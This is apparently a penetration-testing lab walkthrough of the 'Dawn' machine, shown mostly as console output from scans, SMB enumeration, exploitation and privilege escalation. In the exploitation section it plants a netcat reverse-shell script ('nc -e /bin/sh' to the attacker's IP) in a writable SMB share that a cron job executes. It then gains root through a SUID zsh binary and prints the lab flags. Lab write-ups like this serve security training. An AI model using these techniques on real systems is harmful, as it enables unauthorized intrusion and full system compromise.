# Recon

```console
root@kali:/OSCPv3/offsec_pg/Dawn# nmap -Pn -sT -sV -n 192.168.106.11 -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-22 09:24 CST
Warning: 192.168.106.11 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.106.11
Host is up (0.11s latency).
Not shown: 58058 closed ports, 7473 filtered ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
Service Info: Host: DAWN

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.85 seconds
```



## HTTP TCP/80

```console
root@kali:/OSCPv3/offsec_pg/Dawn# curl 192.168.106.11
<!DOCTYPE html>
<html>
   <head>
      <body>
        <style>
         body{
 
             background-color:rgb(199,199,199);
         }
         </style>         
        <h1>Website currently under construction, try again later.</h1>
        <p>In case you are suffering from any kind of inconvenience with your device provided by the corporation please contact with IT support as soon as possible, however, if you are not affiliated by any means with "Non-Existent Corporation and Associates" (NECA) <strong>LEAVE THIS SITE RIGHT NOW.</strong></p>
        <hr>
        <h3>Things we need to implement:</h3>
        <ul>
           <li>Install camera feeds.
           <li>Update our personal.
           <li>Install a control panel.
        </ul>
      </body>
   </head>
</html>       
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Dawn/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Dawn# nmap -Pn -sT -sV --script http-enum -n 192.168.106.11 -p 80
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-22 09:29 CST
Nmap scan report for 192.168.106.11
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-enum: 
|_  /logs/: Logs
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# curl -L http://192.168.106.11/logs
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /logs</title>
 </head>
 <body>
<h1>Index of /logs</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="auth.log">auth.log</a></td><td align="right">2020-08-01 08:03  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="daemon.log">daemon.log</a></td><td align="right">2020-08-01 08:03  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="error.log">error.log</a></td><td align="right">2020-08-01 08:03  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="management.log">management.log</a></td><td align="right">2020-08-12 09:54  </td><td align="right"> 81K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.38 (Debian) Server at 192.168.106.11 Port 80</address>
</body></html>
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# wget http://192.168.106.11/logs/management.log
--2021-11-22 09:34:50--  http://192.168.106.11/logs/management.log
Conectando con 192.168.106.11:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 82679 (81K)
Grabando a: “management.log”

management.log                           100%[================================================================================>]  80,74K   137KB/s    en 0,6s    

2021-11-22 09:34:50 (137 KB/s) - “management.log” guardado [82679/82679]
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# more management.log 
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching direc
tories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/08/12 09:02:06 CMD: UID=0    PID=923    | /usr/sbin/smbd --foreground --no-process-group 
2020/08/12 09:02:06 CMD: UID=0    PID=921    | /usr/sbin/smbd --foreground --no-process-group 
2020/08/12 09:02:06 CMD: UID=0    PID=920    | /usr/sbin/smbd --foreground --no-process-group 
2020/08/12 09:02:06 CMD: UID=0    PID=92     | 
2020/08/12 09:02:06 CMD: UID=0    PID=918    | /usr/sbin/smbd --foreground --no-process-group 
2020/08/12 09:02:06 CMD: UID=0    PID=9      | 
2020/08/12 09:02:06 CMD: UID=7    PID=893    | /usr/lib/cups/notifier/dbus dbus://  
2020/08/12 09:02:06 CMD: UID=0    PID=892    | /usr/sbin/cupsd -l 
2020/08/12 09:02:06 CMD: UID=33   PID=881    | /usr/sbin/apache2 -k start 
2020/08/12 09:02:06 CMD: UID=33   PID=880    | /usr/sbin/apache2 -k start 
2020/08/12 09:02:06 CMD: UID=33   PID=879    | /usr/sbin/apache2 -k start 
2020/08/12 09:02:06 CMD: UID=33   PID=878    | /usr/sbin/apache2 -k start 
2020/08/12 09:02:06 CMD: UID=33   PID=877    | /usr/sbin/apache2 -k start 
2020/08/12 09:02:06 CMD: UID=0    PID=83     | 
2020/08/12 09:02:06 CMD: UID=0    PID=82     | 
2020/08/12 09:02:06 CMD: UID=0    PID=81     | 
...
...
2020/08/12 09:02:06 CMD: UID=0    PID=1      | /sbin/init 
2020/08/12 09:03:02 CMD: UID=0    PID=930    | /usr/sbin/CRON -f 
2020/08/12 09:03:02 CMD: UID=0    PID=929    | /usr/sbin/cron -f 
2020/08/12 09:03:02 CMD: UID=0    PID=928    | /usr/sbin/cron -f 
2020/08/12 09:03:02 CMD: UID=0    PID=927    | /usr/sbin/cron -f 
2020/08/12 09:03:02 CMD: UID=0    PID=926    | /usr/sbin/cron -f 
2020/08/12 09:03:02 CMD: UID=0    PID=932    | /usr/sbin/CRON -f 
2020/08/12 09:03:02 CMD: UID=0    PID=931    | /usr/sbin/CRON -f 
2020/08/12 09:03:02 CMD: UID=0    PID=934    | /usr/sbin/CRON -f 
2020/08/12 09:03:02 CMD: UID=0    PID=933    | /usr/sbin/CRON -f 
2020/08/12 09:03:02 CMD: UID=1000 PID=939    | /bin/sh -c /home/dawn/ITDEPT/product-control 
2020/08/12 09:03:02 CMD: UID=???  PID=938    | ???
2020/08/12 09:03:02 CMD: UID=???  PID=937    | ???
2020/08/12 09:03:02 CMD: UID=33   PID=936    | /bin/sh -c /home/dawn/ITDEPT/web-control 
2020/08/12 09:03:02 CMD: UID=33   PID=940    | /bin/sh -c /home/dawn/ITDEPT/web-control 
2020/08/12 09:04:01 CMD: UID=0    PID=945    | /usr/sbin/CRON -f 
2020/08/12 09:04:01 CMD: UID=0    PID=944    | /usr/sbin/cron -f 
...
...
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# dirb http://192.168.106.11/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Nov 22 09:43:30 2021
URL_BASE: http://192.168.106.11/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.106.11/ ----
+ http://192.168.106.11/index.html (CODE:200|SIZE:791)                                                                                                           
==> DIRECTORY: http://192.168.106.11/logs/                                                                                                                       
+ http://192.168.106.11/server-status (CODE:403|SIZE:302)                                                                                                        
                                                                                                                                                                 
---- Entering directory: http://192.168.106.11/logs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Nov 22 09:52:45 2021
DOWNLOADED: 4612 - FOUND: 2
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# python3 /opt/dirsearch/dirsearch.py -u http://192.168.106.11/ -w /usr/share/dirb/wordlists/big.txt -e php,txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 20469

Error Log: /opt/dirsearch/logs/errors-21-11-22_09-54-53.log

Target: http://192.168.106.11/

[09:54:54] Starting: 
[09:55:46] 301 -  315B  - /cctv  ->  http://192.168.106.11/cctv/
[09:57:10] 301 -  315B  - /logs  ->  http://192.168.106.11/logs/
[09:58:12] 403 -  302B  - /server-status

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# python3 /opt/dirsearch/dirsearch.py -u http://192.168.106.11/  -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6432

Error Log: /opt/dirsearch/logs/errors-21-11-22_09-59-45.log

Target: http://192.168.106.11/

[09:59:46] Starting: 
[10:00:32] 200 -  791B  - /index.html
[10:00:37] 301 -  315B  - /logs  ->  http://192.168.106.11/logs/
[10:00:37] 200 -    2KB - /logs/

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# python3 /opt/dirsearch/dirsearch.py -u http://192.168.106.11/ -e php,txt -x 403 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /opt/dirsearch/logs/errors-21-11-22_10-02-24.log

Target: http://192.168.106.11/

[10:02:24] Starting: 
[10:02:25] 200 -  791B  - /
[10:02:53] 301 -  315B  - /logs  ->  http://192.168.106.11/logs/
[10:04:23] 301 -  315B  - /cctv  ->  http://192.168.106.11/cctv/

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# nikto -h http://192.168.106.11 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.106.11
+ Target Hostname:    192.168.106.11
+ Target Port:        80
+ Start Time:         2021-11-22 10:12:33 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x317 0x58f2eb81ffb49 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3268: /logs/: Directory indexing found.
+ OSVDB-3092: /logs/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26165 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2021-11-22 11:07:02 (GMT-6) (3269 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.38) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? n
```

## SMB TCP/445

```console
root@kali:/OSCPv3/offsec_pg/Dawn# nmap -Pn -sT -n --script smb-enum-shares.nse 192.168.106.11 -p 135,139,445
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-22 11:20 CST
Nmap scan report for 192.168.106.11
Host is up (0.12s latency).

PORT    STATE  SERVICE
135/tcp closed msrpc
139/tcp open   netbios-ssn
445/tcp open   microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.168.106.11\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.9.5-Debian)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.106.11\ITDEPT: 
|     Type: STYPE_DISKTREE
|     Comment: PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\dawn\ITDEPT\
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.106.11\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 21.94 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# smbclient -L 192.168.106.11 -N
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            DAWN
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# smbclient //192.168.106.11/ITDEPT -N
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Nov 22 11:20:46 2021
  ..                                  D        0  Wed Jul 22 12:19:41 2020

		7158264 blocks of size 1024. 3466052 blocks available
smb: \> dir ../
NT_STATUS_OBJECT_NAME_INVALID listing \
smb: \> dir ../../
NT_STATUS_OBJECT_NAME_INVALID listing \
smb: \> 
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# smbclient //192.168.106.11/IPC$ -N
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> exit
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# smbmap -H 192.168.106.11 -u ''
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.168.106.11...
[+] IP: 192.168.106.11:445	Name: 192.168.106.11                                    
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	ITDEPT                                            	READ, WRITE
	IPC$                                              	NO ACCESS
```
# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Dawn# cat product-control 
#!/bin/bash
mkdir test
nc -e /bin/sh 192.168.49.106 9999
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# smbclient //192.168.106.11/ITDEPT -N
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Nov 22 12:19:58 2021
  ..                                  D        0  Mon Nov 22 11:37:01 2021
  web-control                         A       53  Mon Nov 22 11:32:08 2021
  product-control                     A       57  Mon Nov 22 12:19:58 2021

		7158264 blocks of size 1024. 3465904 blocks available
smb: \> exit
```

```console
root@kali:/OSCPv3/offsec_pg/Dawn# nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.49.106] from (UNKNOWN) [192.168.106.11] 49636
whoami
dawn
id
uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
script /dev/null -c bash
Script started, file is /dev/null
dawn@dawn:~$ ^Z
[1]+  Detenido                nc -lvnp 9999
root@kali:/OSCPv3/offsec_pg/Dawn# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Dawn# nc -lvnp 9999
                                               reset
reset: unknown terminal type unknown
Terminal type? xterm
dawn@dawn:~$ export TERM=xterm
dawn@dawn:~$ export SHELL=bash
```

```console
dawn@dawn:~$ cat local.txt 
661f689ef3f5ae351891bbf7c1ac9097
```

# Privilege escalation 

```console
dawn@dawn:~/ITDEPT$ ls
product-control  web-control
dawn@dawn:~/ITDEPT$ cat product-control 
#!/bin/bash
mkdir test
nc -e /bin/sh 192.168.49.106 9999
```

```console
dawn@dawn:/$ sudo -l
Matching Defaults entries for dawn on dawn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dawn may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/mysql
dawn@dawn:/$
```

```console
dawn@dawn:/tmp$ /usr/bin/mysql
ERROR 1045 (28000): Access denied for user 'dawn'@'localhost' (using password: NO)
dawn@dawn:/tmp$
```

```console
dawn@dawn:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/mount.cifs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/zsh
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
dawn@dawn:/tmp$ zsh
dawn# whoami
root
```

```console
dawn# whoami
root
dawn# cd /root 
dawn# ls -la
total 44
drwx------  6 root root 4096 Nov 22 10:23 .
drwxr-xr-x 18 root root 4096 Mar 16  2020 ..
-rw-------  1 root root    0 Aug 12  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Jul 31  2019 .config
-rw-r--r--  1 root root   32 Jul 14  2020 flag.txt
drwx------  3 root root 4096 Aug  1  2019 .gnupg
drwxr-xr-x  3 root root 4096 Jul 31  2019 .local
-rw-------  1 root root    0 Aug  1  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Nov 22 10:23 proof.txt
-rw-r--r--  1 root root   66 Aug  1  2019 .selected_editor
drwxr-xr-x  4 root root 4096 Jul 31  2019 .wine
dawn# cat proof.txt 
20d263dac53d669db7d78380e1f5d250
```



